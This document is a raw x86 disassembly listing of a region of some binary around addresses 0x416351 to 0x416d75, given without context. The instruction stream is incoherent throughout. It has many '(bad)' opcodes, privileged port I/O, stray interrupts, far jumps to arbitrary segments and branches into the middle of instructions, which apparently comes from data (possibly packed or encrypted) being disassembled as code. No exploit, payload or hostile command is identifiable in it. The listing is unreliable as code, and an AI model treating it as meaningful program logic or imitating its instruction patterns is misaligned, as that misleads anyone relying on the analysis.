  416351:	pop    ebp
  416352:	mov    ebp,DWORD PTR [ebx+ecx*1]
  416355:	(bad)  
  416356:	mov    dh,0xd1
  416358:	pop    ds
  416359:	outs   dx,DWORD PTR ds:[esi]
  41635a:	rcr    BYTE PTR ds:0xc41596e8,1
  416360:	in     eax,0xee
  416362:	push   ebx
  416363:	lea    edx,[edx]
  416365:	mov    BYTE PTR ds:0xe718fdbe,cl
  41636b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41636d:	jl     0x4163b6
  41636f:	inc    ecx
  416370:	ret    0xde1e
  416373:	and    al,0x6a
  416375:	int    0x82
  416377:	jecxz  0x4163ad
  416379:	or     BYTE PTR [ebx+0x7c85e464],dl
  41637f:	repz cmp DWORD PTR [ebx-0x7a],0xffffffa4
  416384:	mov    edi,DWORD PTR [ecx+0x3ed1ec15]
  41638a:	loopne 0x41633e
  41638c:	push   esi
  41638d:	shl    dh,cl
  41638f:	lock fadd st(3),st
  416392:	sub    bh,BYTE PTR [ebp+0x3c009c4]
  416398:	out    dx,eax
  416399:	retf   
  41639a:	cld    
  41639b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41639c:	mov    al,0x91
  41639e:	std    
  41639f:	mov    esp,0x141fffa3
  4163a4:	jne    0x416365
  4163a6:	div    DWORD PTR [esi+0x1f]
  4163a9:	sbb    DWORD PTR [ebp+edx*1-0x7ab4128f],esp
  4163b0:	ret    0x3a4
  4163b3:	cmc    
  4163b4:	or     al,0x8a
  4163b6:	imul   BYTE PTR gs:[eax-0x68]
  4163ba:	shr    DWORD PTR [edi-0x621e25da],cl
  4163c0:	das    
  4163c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163c2:	add    al,0x88
  4163c4:	push   edx
  4163c5:	pop    ecx
  4163c6:	jmp    0x4163b6
  4163c8:	pop    ebp
  4163c9:	and    BYTE PTR [esi+0x3a105c8f],dl
  4163cf:	pop    ebp
  4163d0:	(bad)
  4163d3:	cmp    al,0xf9
  4163d5:	jmp    0x391d:0x4e542d7
  4163dc:	jb     0x416449
  4163de:	mov    ebx,0xcf277f4b
  4163e3:	(bad)  
  4163e4:	bnd jmp 0x6bbefb0b
  4163ea:	icebp  
  4163eb:	xchg   BYTE PTR [esi+edx*4-0x30cde3ba],ah
  4163f2:	pop    es
  4163f3:	jl     0x416395
  4163f5:	ins    BYTE PTR es:[edi],dx
  4163f6:	inc    esi
  4163f7:	pop    esi
  4163f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f9:	dec    edx
  4163fa:	ficom  DWORD PTR [esi+0x3a]
  4163fd:	mov    cl,0x52
  4163ff:	ins    BYTE PTR es:[edi],dx
  416400:	outs   dx,DWORD PTR ds:[esi]
  416401:	cli    
  416402:	or     dl,BYTE PTR [esi-0x12]
  416405:	mov    ?,WORD PTR [esi]
  416407:	sbb    ah,BYTE PTR [esi]
  416409:	rdtsc  
  41640b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41640c:	push   esp
  41640d:	sti    
  41640e:	mov    ah,0xb4
	...
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	jg     0x4164bb
  416482:	add    al,0xe7
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	aam    0x5f
  41648e:	fiadd  DWORD PTR [ebx]
  416490:	pop    edx
  416491:	inc    esp
  416492:	dec    edi
  416493:	cmp    DWORD PTR [eax],ebp
  416495:	push   0xffffff8f
  416497:	dec    esi
  416498:	ret    0xc805
  41649b:	push   ecx
  41649c:	das    
  41649d:	repz into 
  41649f:	jo     0x416470
  4164a1:	arpl   WORD PTR [edi+0x5f079ba6],bp
  4164a7:	(bad)  
  4164a8:	ds dec esi
  4164aa:	jns    0x416466
  4164ac:	fdiv   st(2),st
  4164ae:	cmp    eax,0x2d5b9cc5
  4164b3:	stos   DWORD PTR es:[edi],eax
  4164b4:	mov    dh,0x44
  4164b6:	mov    eax,ds:0xfb9c2c10
  4164bb:	push   es
  4164bc:	push   cs
  4164bd:	ds xchg esp,eax
  4164bf:	cli    
  4164c0:	mov    esi,0xcd5c5ec3
  4164c5:	or     al,0xa7
  4164c7:	ja     0x4164c6
  4164c9:	inc    eax
  4164ca:	inc    ebp
  4164cb:	std    
  4164cc:	les    ax,DWORD PTR [edx-0x6b]
  4164d0:	cmp    DWORD PTR [ebx+0x3ed55bf6],edi
  4164d6:	rcr    DWORD PTR [ecx],0x76
  4164d9:	aaa    
  4164da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164db:	pop    edi
  4164dc:	xor    DWORD PTR [ebp+0x2d],ebp
  4164df:	mov    ch,0x7
  4164e1:	mov    ebx,0x9cb89363
  4164e6:	dec    esi
  4164e7:	mov    dl,0x30
  4164e9:	push   ecx
  4164ea:	je     0x41651b
  4164ec:	hlt    
  4164ed:	mov    ebp,0x4c0a5a32
  4164f2:	fsubr  QWORD PTR [edi]
  4164f4:	cmp    al,0xf5
  4164f6:	fidiv  WORD PTR [esi+0x34b8c777]
  4164fc:	scas   eax,DWORD PTR es:[edi]
  4164fd:	ins    BYTE PTR es:[edi],dx
  4164fe:	dec    ebx
  4164ff:	push   ds
  416500:	out    dx,eax
  416501:	adc    dh,BYTE PTR [edi+0x65]
  416504:	inc    esp
  416505:	ja     0x416583
  416507:	xchg   DWORD PTR [ecx],ecx
  416509:	loope  0x416587
  41650b:	jns    0x4164bf
  41650d:	mov    dh,0x6b
  41650f:	mov    ss,WORD PTR [edx-0x3fbe76b8]
  416515:	push   0x83e861a2
  41651a:	cmp    al,ah
  41651c:	xchg   ebx,eax
  41651d:	stos   DWORD PTR es:[edi],eax
  41651e:	inc    eax
  41651f:	inc    esi
  416520:	dec    eax
  416521:	sti    
  416522:	sub    cl,al
  416524:	xchg   BYTE PTR [edi],ch
  416526:	push   cs
  416527:	js     0x416543
  416529:	lahf   
  41652a:	mov    edi,0xaf95fbf8
  41652f:	xchg   edi,eax
  416530:	pop    ss
  416531:	pusha  
  416532:	sti    
  416533:	pop    edi
  416534:	clc    
  416535:	(bad)  
  416536:	je     0x41654e
  416538:	pop    ebx
  416539:	mov    dl,0xf9
  41653b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41653c:	aaa    
  41653d:	clc    
  41653e:	jge    0x41651e
  416540:	mov    bh,0x8f
  416542:	or     al,BYTE PTR [ebx-0x400ed885]
  416548:	cmc    
  416549:	push   ebp
  41654a:	outs   dx,DWORD PTR ds:[esi]
  41654b:	cmc    
  41654c:	in     eax,dx
  41654d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41654e:	mov    al,0xec
  416550:	push   esp
  416551:	(bad)  [edi-0xc]
  416554:	jns    0x4164de
  416556:	test   DWORD PTR [esi],esi
  416558:	xchg   ecx,eax
  416559:	clc    
  41655a:	and    ch,BYTE PTR [edx]
  41655c:	jle    0x41651d
  41655e:	xchg   BYTE PTR [ebx],bl
  416560:	inc    cl
  416562:	push   eax
  416563:	add    BYTE PTR [ecx+eiz*4-0x79],al
  416567:	popf   
  416568:	inc    ebp
  416569:	push   esi
  41656a:	xor    eax,0x7d44c6b2
  41656f:	out    0xf5,al
  416571:	xchg   edx,eax
  416572:	gs loope 0x416505
  416575:	xchg   ebp,eax
  416576:	add    BYTE PTR [ecx+0x3a8457ab],ah
  41657c:	cmc    
  41657d:	stos   BYTE PTR es:[edi],al
  41657e:	push   edx
  41657f:	outs   dx,DWORD PTR ds:[esi]
  416580:	ins    DWORD PTR es:[edi],dx
  416581:	call   0xb6ea:0xa88fa991
  416588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416589:	(bad)  
  41658b:	add    BYTE PTR [ebx+0x41e9e1],al
	...
  4165f1:	add    BYTE PTR [eax],al
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x3bb04354]
  416601:	ins    BYTE PTR es:[edi],dx
  416602:	push   cs
  416603:	cdq    
  416604:	inc    esp
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    al,0x1
  41660a:	add    BYTE PTR [eax],al
  41660c:	mov    ch,0x74
  41660e:	add    DWORD PTR [ebx+0x54],0x4552c346
  416615:	push   edi
  416616:	inc    edx
  416617:	into   
  416618:	push   0x31a2bdcd
  41661d:	popf   
  41661e:	jge    0x416690
  416620:	in     al,dx
  416621:	pop    esi
  416622:	jl     0x41665e
  416624:	aad    0x6a
  416626:	mov    BYTE PTR [edx+0x2b1a3931],ch
  41662c:	sbb    al,0xbb
  41662e:	mov    dh,0x74
  416630:	pop    ecx
  416631:	ins    DWORD PTR es:[edi],dx
  416632:	call   0xbc6c:0xfe5b2983
  416639:	cmp    eax,0xf10a0449
  41663e:	in     al,0x2
  416640:	out    0x71,eax
  416642:	int    0x1e
  416644:	in     al,0x31
  416646:	cmp    eax,0x44d8a64f
  41664b:	dec    ebp
  41664c:	cli    
  41664d:	or     edi,edi
  41664f:	cmp    al,al
  416651:	div    cl
  416653:	mov    edi,0x57c23f72
  416658:	ins    BYTE PTR es:[edi],dx
  416659:	outs   dx,DWORD PTR ds:[esi]
  41665a:	nop
  41665b:	push   ebp
  41665c:	dec    esi
  41665d:	out    dx,al
  41665e:	arpl   WORD PTR [esi+0x267b4205],di
  416664:	(bad)  
  416665:	out    0xa3,al
  416667:	(bad)  
  416669:	call   0x2b5d:0xe5fb61b2
  416670:	adc    BYTE PTR [eax+ebp*1+0x49],0x70
  416675:	or     al,0x2c
  416677:	xchg   ebx,eax
  416678:	sub    ch,BYTE PTR [ebx+0x755cd9cc]
  41667e:	cmc    
  41667f:	mov    ebp,0x86a6b37e
  416684:	int3   
  416685:	jl     0x416610
  416687:	out    dx,al
  416688:	in     al,0x21
  41668a:	repz pop es
  41668c:	sbb    ecx,eax
  41668e:	lods   eax,DWORD PTR ds:[esi]
  41668f:	ret    0xefc1
  416692:	cmp    eax,0x3fe3fd5c
  416697:	xor    BYTE PTR [ecx-0x6c],al
  41669a:	jmp    0xad06b559
  41669f:	sbb    al,al
  4166a1:	mov    ds:0x55f6f611,al
  4166a6:	sbb    bh,BYTE PTR [edi]
  4166a8:	out    dx,eax
  4166a9:	int3   
  4166aa:	jl     0x4166d4
  4166ac:	inc    esp
  4166ad:	mov    ebx,DWORD PTR [ebp+0x2ad7995d]
  4166b3:	pop    esi
  4166b4:	xor    DWORD PTR [ebx-0x308f7f65],ebx
  4166ba:	sbb    bh,0xae
  4166bd:	scas   eax,DWORD PTR es:[edi]
  4166be:	dec    ebx
  4166bf:	mov    bh,0x28
  4166c1:	data16 jb 0x41666c
  4166c4:	inc    ecx
  4166c5:	or     DWORD PTR [edi-0x5e],edi
  4166c8:	pop    ebx
  4166c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ca:	dec    edx
  4166cb:	push   es
  4166cc:	and    edi,DWORD PTR [eax-0x7]
  4166cf:	cmp    BYTE PTR [ebp+0x56],ah
  4166d2:	out    dx,eax
  4166d3:	aam    0xd3
  4166d5:	fst    DWORD PTR [edi+eax*4-0x3029bdcc]
  4166dc:	mov    eax,ds:0x93cb9399
  4166e1:	cmp    BYTE PTR [esi],ah
  4166e3:	jne    0x4166fc
  4166e5:	call   0x533f0fb3
  4166ea:	adc    al,0x66
  4166ec:	mov    esp,0x6d41642b
  4166f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166f2:	jbe    0x416744
  4166f4:	daa    
  4166f5:	mov    al,0x85
  4166f7:	mov    edi,0xbb2496a7
  4166fc:	and    bh,al
  4166fe:	mov    eax,ds:0x37d3a879
  416703:	or     al,0x10
  416705:	push   es
  416706:	xchg   edi,eax
  416707:	es dec esi
  416709:	icebp  
  41670a:	mov    ebp,0x8422d48a
  41670f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	xor    eax,0x483e5a01
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	idiv   DWORD PTR ds:0x4f3017be
  416792:	arpl   WORD PTR [edi+eiz*8+0xf],bp
  416796:	cmp    DWORD PTR [ecx],edx
  416798:	aas    
  416799:	push   esi
  41679a:	in     eax,0x7
  41679c:	xchg   dl,ah
  41679e:	mov    ebp,0xbb8bd03b
  4167a3:	inc    ecx
  4167a4:	mov    al,BYTE PTR [esi]
  4167a6:	call   0x6e86:0xf85013a8
  4167ad:	ret    0x86d6
  4167b0:	sbb    al,0x91
  4167b2:	stos   BYTE PTR es:[edi],al
  4167b3:	pop    edi
  4167b4:	shl    ah,0xd9
  4167b7:	test   BYTE PTR [edi+edi*8-0x89e6e69],cl
  4167be:	xor    cl,BYTE PTR [esi-0x31]
  4167c1:	dec    esp
  4167c2:	pusha  
  4167c3:	rcl    DWORD PTR gs:0xdc8ce4fe,0xd7
  4167cb:	pop    edx
  4167cc:	sub    BYTE PTR [ecx+0x5d],al
  4167cf:	lods   al,BYTE PTR ds:[esi]
  4167d0:	les    si,DWORD PTR [edi]
  4167d3:	cmp    cl,bh
  4167d5:	xor    al,0xb
  4167d7:	xchg   ebp,eax
  4167d8:	pushf  
  4167d9:	dec    ecx
  4167da:	push   ebx
  4167db:	adc    BYTE PTR [edx+ebp*8+0x5818ec3a],al
  4167e2:	lea    ecx,[eax-0x126abf93]
  4167e8:	and    al,0x48
  4167eb:	call   0x2e7f:0x191de575
  4167f2:	push   0xc8e6f1f7
  4167f7:	lea    esi,[ebx+0x5b]
  4167fa:	stc    
  4167fb:	mov    esp,0x9f8eda6c
  416800:	and    BYTE PTR [ebp-0x65725f20],ah
  416806:	xor    bl,bh
  416808:	icebp  
  416809:	daa    
  41680a:	adc    BYTE PTR [eax],ch
  41680c:	adc    ecx,edi
  41680e:	pop    eax
  41680f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416810:	in     al,dx
  416811:	pop    edi
  416812:	rcl    ch,1
  416814:	enter  0xf0fc,0x5f
  416818:	inc    edi
  416819:	dec    eax
  41681a:	loopne 0x416825
  41681c:	fwait
  41681d:	cmp    BYTE PTR [edi],bl
  41681f:	push   ss
  416820:	int3   
  416821:	clc    
  416822:	ja     0x41689f
  416824:	(bad)  
  416826:	jl     0x416860
  416828:	dec    esp
  416829:	lock or edx,DWORD PTR [eax]
  41682c:	mov    esp,0xd7e55c82
  416831:	(bad)  
  416832:	sbb    eax,0x4e850bff
  416837:	int    0x4d
  416839:	sbb    cl,BYTE PTR ds:0x9ffd6e66
  41683f:	stc    
  416840:	pop    ss
  416841:	or     eax,0x9c426711
  416846:	mov    ah,0xd5
  416848:	(bad)  
  41684a:	jnp    0x4168a5
  41684c:	hlt    
  41684d:	mov    cl,0xdd
  41684f:	hlt    
  416850:	out    0x44,al
  416852:	xchg   edi,eax
  416853:	or     DWORD PTR [ecx],0x66
  416856:	pop    edi
  416857:	add    esi,DWORD PTR [edx+0x18ddce5e]
  41685d:	sbb    DWORD PTR [edi-0x7f7e2a90],esp
  416863:	jl     0x4168d7
  416865:	push   esi
  416866:	jge    0x41689d
  416868:	sbb    cl,al
  41686a:	loop   0x416842
  41686c:	mov    al,0x24
  41686e:	sub    BYTE PTR ds:0x5bafec7d,ch
  416874:	jge    0x41683c
  416876:	aad    0x2
  416878:	sbb    ebx,ecx
  41687a:	call   0x7c9e:0x61fcc4df
  416881:	mov    esi,0x4d4a1ba5
  416886:	dec    edx
  416887:	shr    ebp,0x2f
  41688a:	adc    DWORD PTR [edi+0x1e35d2bd],ebx
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x8799b9c1
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	cmp    dl,bh
  41690e:	in     eax,0x32
  416910:	inc    eax
  416911:	lea    eax,[edi]
  416913:	lods   al,BYTE PTR ds:[esi]
  416914:	or     BYTE PTR [ecx-0x7d],cl
  416917:	or     edi,DWORD PTR [ebx]
  416919:	dec    edi
  41691a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41691b:	js     0x4168cc
  41691d:	mov    ebx,0x82a0088b
  416922:	outs   dx,BYTE PTR ds:[esi]
  416923:	jo     0x4169a0
  416925:	(bad)  
  416926:	arpl   WORD PTR [ebx-0x2afbaede],cx
  41692c:	mov    ds:0xd5ac3788,al
  416931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416932:	pop    ecx
  416933:	mov    esp,0x522c9c12
  416938:	jl     0x4168e1
  41693a:	es push esi
  41693c:	es cdq 
  41693e:	xchg   ebp,eax
  41693f:	retf   0xf09b
  416942:	outs   dx,BYTE PTR ds:[esi]
  416943:	mov    eax,0x5e3c10
  416948:	and    dl,dl
  41694a:	mov    al,ds:0xdf6efa2d
  41694f:	push   ds
  416950:	add    eax,0xaff01ad4
  416955:	mov    ch,0x31
  416957:	nop
  416958:	out    0xd6,al
  41695a:	ins    DWORD PTR es:[edi],dx
  41695b:	outs   dx,BYTE PTR ds:[esi]
  41695c:	pop    eax
  41695d:	inc    esi
  41695e:	xchg   esi,eax
  41695f:	or     eax,0xb9f9671a
  416964:	out    dx,eax
  416965:	dec    ebx
  416966:	sub    dh,al
  416968:	cld    
  416969:	sbb    DWORD PTR [ebx-0x4f55396b],0x8c83f723
  416973:	inc    edx
  416974:	(bad)  
  416975:	in     eax,0x97
  416977:	xlat   BYTE PTR ds:[ebx]
  416978:	dec    DWORD PTR [edx]
  41697a:	std    
  41697b:	adc    BYTE PTR [ebp+0x7d404f3a],ch
  416981:	dec    esi
  416982:	pop    eax
  416983:	gs addr16 inc eax
  416986:	jne    0x4169f2
  416988:	(bad)  
  416989:	shl    BYTE PTR [esi],cl
  41698b:	rol    DWORD PTR [ebp+eax*8+0x75],cl
  41698f:	inc    DWORD PTR [esi+0x6]
  416992:	cwde   
  416993:	scas   eax,DWORD PTR es:[edi]
  416994:	pop    edi
  416995:	es stc 
  416997:	jb     0x416a0b
  416999:	imul   ebp,DWORD PTR [ecx+0x7f],0x9e7c282
  4169a0:	ja     0x4169d1
  4169a2:	retf   
  4169a3:	frstor [edi+0x1]
  4169a6:	iret   
  4169a7:	or     esp,DWORD PTR [edi]
  4169a9:	fidiv  WORD PTR [esi+0x53]
  4169ac:	in     eax,0x69
  4169ae:	jl     0x416a0c
  4169b0:	cmp    al,0x52
  4169b2:	inc    ebx
  4169b3:	gs shr eax,cl
  4169b6:	inc    eax
  4169b7:	push   0x51c8f84f
  4169bc:	inc    DWORD PTR [ebp-0x6e62f4ed]
  4169c2:	in     al,dx
  4169c3:	jb     0x416a42
  4169c5:	pop    ebx
  4169c6:	sahf   
  4169c7:	lods   eax,DWORD PTR ds:[esi]
  4169c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c9:	scas   eax,DWORD PTR es:[edi]
  4169ca:	retf   
  4169cb:	adc    BYTE PTR [edx+0x76ff3a1],bl
  4169d1:	sub    eax,0x1e6933a3
  4169d6:	mov    ds:0xc1039c00,eax
  4169db:	out    dx,eax
  4169dc:	add    eax,DWORD PTR [edx-0xd]
  4169df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e0:	adc    BYTE PTR [ebx+0x1b11ebaa],0x70
  4169e7:	xchg   esp,eax
  4169e8:	mov    ebx,0x3590237d
  4169ed:	sbb    BYTE PTR [edi+esi*4],bh
  4169f0:	gs pop eax
  4169f2:	addr16 push esi
  4169f4:	jp     0x416a2d
  4169f6:	xchg   esi,eax
  4169f7:	scas   al,BYTE PTR es:[edi]
  4169f8:	(bad)  
  4169f9:	shr    al,cl
  4169fb:	cmp    edi,eax
  4169fd:	dec    edi
  4169fe:	mov    WORD PTR [ebx],es
  416a00:	sub    DWORD PTR [edi-0x59fd6619],ebx
  416a06:	repnz pop edi
  416a08:	jl     0x416a08
  416a0a:	pushf  
  416a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a0c:	enter  0x327d,0x9d
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x42900ba3
  416a82:	addr16 loopne 0x416ad5
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	inc    ebx
  416a8d:	mov    eax,ds:0xbaadcdc6
  416a92:	jbe    0x416a21
  416a94:	test   eax,ebp
  416a96:	inc    edi
  416a97:	js     0x416ad7
  416a99:	inc    eax
  416a9a:	js     0x416aba
  416a9c:	push   0x60c93116
  416aa1:	or     BYTE PTR [eax],ah
  416aa3:	dec    ebx
  416aa4:	rcl    dh,1
  416aa6:	dec    edx
  416aa7:	xor    al,0x9e
  416aa9:	(bad)  
  416aaa:	(bad)  
  416aab:	mov    cl,0xe6
  416aad:	dec    ecx
  416aae:	ins    BYTE PTR es:[edi],dx
  416aaf:	scas   eax,DWORD PTR es:[edi]
  416ab0:	outs   dx,BYTE PTR ds:[esi]
  416ab1:	stos   DWORD PTR es:[edi],eax
  416ab2:	imul   ebp,DWORD PTR [ecx+0x5ab2527c],0xffffffbd
  416ab9:	mov    al,ds:0xcb22ff60
  416abe:	jmp    0x416a92
  416ac0:	inc    edx
  416ac1:	daa    
  416ac2:	cwde   
  416ac3:	sti    
  416ac4:	add    eax,0x12d4cea
  416ac9:	sbb    BYTE PTR [ebp+0x34],0x54
  416acd:	call   0x5a98d7ef
  416ad2:	xor    ah,BYTE PTR [ebp+0x26]
  416ad5:	push   ecx
  416ad6:	mov    edx,0x20f05980
  416adb:	ficom  WORD PTR [edi+0x25ea3307]
  416ae1:	mov    esi,0x9d1e61a7
  416ae6:	mov    ds:0x1590f40f,al
  416aeb:	es add eax,0x339ab5c6
  416af1:	mov    cl,0xcb
  416af3:	out    0xbd,al
  416af5:	dec    ebx
  416af6:	mov    DWORD PTR ds:0x464e4657,0x98c54dd8
  416b00:	popa   
  416b01:	push   edx
  416b02:	mov    bl,0x6
  416b04:	pop    esi
  416b05:	stos   BYTE PTR es:[edi],al
  416b06:	sub    eax,0x1842a61c
  416b0b:	mov    al,ds:0xfe4bcaeb
  416b10:	cmp    edx,DWORD PTR [edx+esi*2]
  416b13:	ret    0x54d5
  416b16:	stos   DWORD PTR es:[edi],eax
  416b17:	pop    ebx
  416b18:	test   BYTE PTR [esi],dh
  416b1a:	into   
  416b1b:	cmc    
  416b1c:	sti    
  416b1d:	(bad)
  416b20:	sbb    al,0xac
  416b22:	add    edi,DWORD PTR [eax+0x38]
  416b25:	into   
  416b26:	bound  edi,QWORD PTR [ebx-0x311724e7]
  416b2c:	rcl    BYTE PTR [ebx],1
  416b2e:	xlat   BYTE PTR ds:[ebx]
  416b2f:	pop    edx
  416b30:	add    esi,DWORD PTR [eax]
  416b32:	in     al,dx
  416b33:	fild   QWORD PTR [edx+0x7e]
  416b36:	jg     0x416b71
  416b38:	in     al,dx
  416b39:	sar    BYTE PTR [esi-0x2a6681ef],1
  416b3f:	outs   dx,BYTE PTR ds:[esi]
  416b40:	add    eax,0xba7cd449
  416b45:	or     esi,edx
  416b47:	lds    esp,FWORD PTR [edx-0x2d]
  416b4a:	mov    edi,esi
  416b4c:	dec    esp
  416b4d:	fnstenv [esi+0x51db05c8]
  416b53:	push   ss
  416b54:	push   esp
  416b55:	add    eax,eax
  416b57:	sub    DWORD PTR [ecx+edi*2-0x5e5d1c13],ebx
  416b5e:	lahf   
  416b5f:	scas   al,BYTE PTR es:[edi]
  416b60:	sti    
  416b61:	(bad)  
  416b62:	nop    esp
  416b65:	sbb    esi,edx
  416b67:	pop    ds
  416b68:	rol    BYTE PTR [edx+0x73],cl
  416b6b:	sbb    BYTE PTR [edx-0x167a8ac4],bh
  416b71:	ret    0x6c2d
  416b74:	js     0x416b51
  416b76:	adc    ah,BYTE PTR [ebx]
  416b78:	mov    eax,edx
  416b7a:	mov    edi,DWORD PTR [edx+0x403bcc83]
  416b80:	in     eax,dx
  416b81:	pop    eax
  416b82:	and    DWORD PTR [edi],edx
  416b84:	std    
  416b85:	int    0xeb
  416b87:	inc    eax
  416b88:	rcr    cl,1
  416b8a:	jne    0x416ba6
  416b8c:	adc    ebp,ecx
  416b8e:	jmp    0x416b14
	...
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x4b5b70a9
  416c01:	std    
  416c02:	cld    
  416c03:	sbb    DWORD PTR [eax+esi*8+0x0],edx
  416c07:	add    BYTE PTR [ecx+eax*1],al
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	ja     0x416be3
  416c0e:	mov    ebx,0x3944cb88
  416c13:	mov    dh,0x6e
  416c15:	loope  0x416bc0
  416c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c18:	mov    edx,0x61f41664
  416c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c1e:	imul   ebp,DWORD PTR [ebx],0xdf48120
  416c24:	jle    0x416bba
  416c26:	out    dx,eax
  416c27:	cs adc eax,0xf6f725a
  416c2d:	sti    
  416c2e:	add    BYTE PTR [ecx],0x3b
  416c31:	jmp    0x60325bec
  416c36:	jmp    0x9ffe:0xa42fe7a3
  416c3d:	mov    ?,WORD PTR [ecx+0x42cf5811]
  416c43:	stc    
  416c44:	add    esp,DWORD PTR [esi+esi*2]
  416c47:	icebp  
  416c48:	xchg   DWORD PTR [ecx],ecx
  416c4a:	aas    
  416c4b:	jbe    0x416ca9
  416c4d:	jle    0x416bd7
  416c4f:	push   ss
  416c50:	in     al,dx
  416c51:	ret    
  416c52:	stos   DWORD PTR es:[edi],eax
  416c53:	xor    ebp,0x48
  416c56:	in     al,0x1d
  416c58:	mov    ds:0x38ad5b79,al
  416c5d:	cmp    sp,bp
  416c60:	cld    
  416c61:	inc    edx
  416c62:	inc    eax
  416c63:	stos   DWORD PTR es:[edi],eax
  416c64:	cwde   
  416c65:	jle    0x416c3d
  416c67:	std    
  416c68:	mov    ds,WORD PTR [ebp-0x38]
  416c6b:	lods   al,BYTE PTR ds:[esi]
  416c6c:	mov    cs,WORD PTR [ecx+0x4d]
  416c6f:	icebp  
  416c70:	retf   
  416c71:	enter  0x25ac,0x39
  416c75:	mov    edx,0xa8d5206d
  416c7a:	and    DWORD PTR [eax],edx
  416c7c:	cld    
  416c7d:	xchg   esp,eax
  416c7e:	cmp    eax,0xd4bf4794
  416c83:	xchg   esp,eax
  416c84:	mov    dl,0x2
  416c86:	cs mov ah,0xb1
  416c89:	(bad)  
  416c8a:	xchg   edx,eax
  416c8b:	jecxz  0x416caa
  416c8d:	push   cs
  416c8e:	fiadd  WORD PTR [ecx+0x6dfdeafe]
  416c94:	pop    eax
  416c95:	lds    eax,FWORD PTR [esp+edx*1+0x6c860a35]
  416c9c:	pop    es
  416c9d:	fstp   QWORD PTR [ecx-0x6]
  416ca0:	ror    BYTE PTR [edi],1
  416ca2:	mov    dl,0xfc
  416ca4:	cmp    al,al
  416ca6:	or     esp,DWORD PTR [eax+0x4f630895]
  416cac:	adc    al,0x87
  416cae:	mov    ah,0x6b
  416cb0:	gs out 0x4a,eax
  416cb3:	inc    ebx
  416cb4:	and    eax,0x671696d
  416cb9:	xor    eax,0xd5f9ed99
  416cbe:	or     ecx,DWORD PTR [edi-0x6d]
  416cc1:	loopne 0x416ce3
  416cc3:	imul   esi,DWORD PTR [ecx-0x7d],0xfffffffe
  416cc7:	dec    esi
  416cc8:	nop
  416cc9:	adc    al,0x17
  416ccb:	adc    cl,BYTE PTR [esi]
  416ccd:	adc    esi,DWORD PTR [esi+0x19]
  416cd0:	push   es
  416cd1:	test   al,0xb
  416cd3:	push   eax
  416cd4:	outs   dx,DWORD PTR ds:[esi]
  416cd5:	cld    
  416cd6:	ss (bad) 
  416cd8:	fidiv  DWORD PTR [ebx-0x190e10b1]
  416cde:	gs jecxz 0x416d0c
  416ce1:	inc    esp
  416ce2:	mov    eax,0x3c1cb5c4
  416ce7:	dec    ebx
  416ce8:	sbb    al,BYTE PTR [ecx-0x2e]
  416ceb:	scas   eax,DWORD PTR es:[edi]
  416cec:	or     dh,BYTE PTR [eax-0x6e]
  416cef:	lds    ecx,FWORD PTR [ebp+0x2f61dcc3]
  416cf5:	dec    edx
  416cf6:	lds    ebx,FWORD PTR [ebp+0x76]
  416cf9:	ins    DWORD PTR es:[edi],dx
  416cfa:	push   eax
  416cfb:	aaa    
  416cfc:	ror    BYTE PTR [ecx+ecx*2+0x2edce6c7],1
  416d03:	ins    DWORD PTR es:[edi],dx
  416d04:	int3   
  416d05:	adc    dh,BYTE PTR [esi-0x28]
  416d08:	and    ecx,esi
  416d0a:	les    ebp,FWORD PTR [eax+0x6c]
  416d0d:	es jcxz 0x416d11
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
